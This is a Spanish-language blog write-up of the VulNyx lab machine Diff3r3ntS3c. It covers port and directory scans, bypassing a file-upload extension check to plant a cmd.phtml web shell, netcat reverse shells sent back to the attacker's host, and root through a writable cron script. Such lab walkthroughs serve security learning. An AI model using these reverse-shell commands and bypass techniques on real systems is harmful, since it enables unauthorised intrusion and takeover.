<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">VulNyx - Diff3r3ntS3c | noname</title>
<meta property="og:title" content="VulNyx - Diff3r3ntS3c | noname" />
<meta name="twitter:title" content="VulNyx - Diff3r3ntS3c | noname" />
<meta itemprop="name" content="VulNyx - Diff3r3ntS3c | noname" />
<meta name="application-name" content="VulNyx - Diff3r3ntS3c | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Diff3r3ntS3c üü¢">
<meta itemprop="description" content="Writeup Diff3r3ntS3c üü¢" />
<meta property="og:description" content="Writeup Diff3r3ntS3c üü¢" />
<meta name="twitter:description" content="Writeup Diff3r3ntS3c üü¢" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/nyx/dsec/" title="" />



  <meta itemprop="image" content="https://0x-noname.github.io/images/logo.png" />
  <meta property="og:image" content="https://0x-noname.github.io/images/logo.png" />
  <meta name="twitter:image" content="https://0x-noname.github.io/images/logo.png" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/images/logo.png" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-04-03T11:40:11&#43;0200 />
    <meta property="article:published_time" content=2024-04-03T11:40:11&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "VulNyx - Diff3r3ntS3c",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-04-03",
        "description": "Writeup Diff3r3ntS3c üü¢",
        "wordCount":  475 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-04-03",
        "image": {
        "@type": "imageObject",
        "url": "\/images\/logo.png"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<meta name="generator" content="Hugo 0.125.7">

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/nyx/dsec/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    
  

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">VulNyx - Diff3r3ntS3c</h1>
                
                
                <div class="post-meta">
                    <time datetime="2024-04-03T11:40:11&#43;02:00" itemprop="datePublished"> Apr 3, 2024 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/nyx/dsec/ds3c_logo.webp" alt="logo"></p>
<ul>
<li><em>File Upload - (Bypass Extension Check)</em></li>
<li><em>Abusing Cron Job - (Privesc/script.sh)</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.1.14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl 64
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sV -sC -p 80 -v 192.168.1.14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.57 ((Debian))
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET POST OPTIONS HEAD
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
</span></span><span class="line"><span class="cl">|_http-title: Diff3r3ntS3c
</span></span></code></pre></div><h2 id="http-tcp---80">HTTP TCP - 80</h2>
<p><img src="/../machines/nyx/dsec/http.webp" alt="http"></p>
<p>En <strong>Get In Touch</strong> veo una herramienta para subir archivos.</p>
<p><img src="/../machines/nyx/dsec/GetInTouch.webp" alt="GetInTouch"></p>
<p>Introduzco datos e intento subir un archivo <strong>php</strong>.</p>
<p><img src="/../machines/nyx/dsec/GetInTouch2.webp" alt="GetInTouch2"></p>
<p>Me devuelve el siguiente error.</p>
<p><img src="/../machines/nyx/dsec/GetInTouch2Error.webp" alt="GetInTouch2Error"></p>
<p>Intercepto la petici√≥n con <strong>BurpSuite</strong> y la mando al <strong>intruder</strong>.</p>
<p><img src="/../machines/nyx/dsec/intruder.webp" alt="intruder"></p>
<p>En la pesta√±a <strong>payloads</strong> a√±ado diferentes extensiones para comprobar si existe alguna extensi√≥n v√°lida que me permita subir, mas abajo en el apartado <strong>Payload encoding</strong> desmarco la casilla <code>URL-encode these characters</code>.</p>
<p><img src="/../machines/nyx/dsec/payloads.webp" alt="payloads"></p>
<p>Pulso de bot√≥n <strong>Start-attack</strong>.</p>
<p><img src="/../machines/nyx/dsec/resume_attack.webp" alt="resume_attack"></p>
<p>Realizo fuerza bruta de directorios y encuentro la carpeta <strong>uploads</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ gobuster dir -u 192.168.1.13 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://192.168.1.13
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">==============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">==============================================================
</span></span><span class="line"><span class="cl">/images               (Status: 301) [Size: 313] [--&gt; http://192.168.1.13/images/]
</span></span><span class="line"><span class="cl">/uploads              (Status: 301) [Size: 314] [--&gt; http://192.168.1.13/uploads/]
</span></span><span class="line"><span class="cl">/assets               (Status: 301) [Size: 313] [--&gt; http://192.168.1.13/assets/]
</span></span></code></pre></div><p>Al visitar el directorio <strong>uploads</strong> veo lo siguiente.</p>
<p><img src="/../machines/nyx/dsec/uploads.webp" alt="uploads"></p>
<p>En el directorio <strong>n√∫mero 6</strong> tengo estos dos archivos.</p>
<p><img src="/../machines/nyx/dsec/dir6.webp" alt="dir6"></p>
<p>El archivo <code>userinfo.txt</code> contiene el nombre y el n√∫mero de tel√©fono.</p>
<p><img src="/../machines/nyx/dsec/userinfo.webp" alt="userinfo"></p>
<p>El archivo <code>cmd.phtml</code> se ha subido correctamente y puedo ejecutar comandos.</p>
<p><img src="/../machines/nyx/dsec/rce.webp" alt="rce"></p>
<p>Lanzo la shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl &#34;http://192.168.1.13/uploads/6/cmd.phtml?cmd=nc%20-c%20/bin/bash%20192.168.1.20%20443&#34;
</span></span></code></pre></div><p>Obtengo la shell como usuario <strong>candidate</strong>.</p>
<p><img src="/../machines/nyx/dsec/shellUser.webp" alt="shellUser"></p>
<p>Realizo el tratamiento para la TTY.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">ctrl +z
</span></span><span class="line"><span class="cl">stty raw -echo;fg
</span></span><span class="line"><span class="cl">reset
</span></span><span class="line"><span class="cl">xterm
</span></span><span class="line"><span class="cl">stty rows 50 cols 200
</span></span><span class="line"><span class="cl">export TERM=xterm-256color SHELL=bash
</span></span><span class="line"><span class="cl">source /etc/skel/.bashrc
</span></span></code></pre></div><p>Enumero el sistema por tareas cron y veo que el script <code>makeBackup.sh</code> se lanza como usuario root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">candidate@Diff3r3ntS3c:/home/candidate$ cat /etc/crontab
</span></span></code></pre></div><p><img src="/../machines/nyx/dsec/cron.webp" alt="cron"></p>
<p>Compruebo los permisos del archivo <code>makeBackup.sh</code> y veo que tengo todos los permisos.</p>
<p><img src="/../machines/nyx/dsec/makeBackup.webp" alt="makeBackup"></p>
<p>El contenido de <code>makeBackup.sh</code> es el siguiente:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># Source folder to be backed up</span>
</span></span><span class="line"><span class="cl"><span class="nv">source_folder</span><span class="o">=</span><span class="s2">&#34;/var/www/html/uploads/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Destination folder for the backup</span>
</span></span><span class="line"><span class="cl"><span class="nv">backup_folder</span><span class="o">=</span><span class="s2">&#34;/home/candidate/.backups/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create backup folder if it doesn&#39;t exist</span>
</span></span><span class="line"><span class="cl">mkdir -p <span class="s2">&#34;</span><span class="nv">$backup_folder</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Backup file name</span>
</span></span><span class="line"><span class="cl"><span class="nv">backup_file</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">backup_folder</span><span class="si">}</span><span class="s2">backup.tar.gz&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create a compressed tar archive of the source folder</span>
</span></span><span class="line"><span class="cl">tar -czf <span class="s2">&#34;</span><span class="nv">$backup_file</span><span class="s2">&#34;</span> -C <span class="s2">&#34;</span><span class="nv">$source_folder</span><span class="s2">&#34;</span> .
</span></span></code></pre></div><p>El script automatiza la tarea de crear una copia de seguridad comprimida de los archivos en el directorio especificado, pero en este caso no importa lo que hace el script, lo que si importa es que al tener permisos de escritura puedo modificarlo para obtener una shell de <strong>root</strong>.  Edito el script y lo dejo de la siguiente forma:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">#!/bin/bash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">nc -c /bin/bash 192.168.1.20 444 
</span></span></code></pre></div><p>Dejo un netcat a la escucha y en unos segundos obtengo el root.</p>
<p><img src="/../machines/nyx/dsec/root.webp" alt="root"></p>
<p>Y aqu√≠ termina la m√°quina Diff3r3ntS3c.</p>
<p>Saludos!</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        ¬© 2024 .
        
    </small>
</footer><a href="#" title="" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    






    
    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
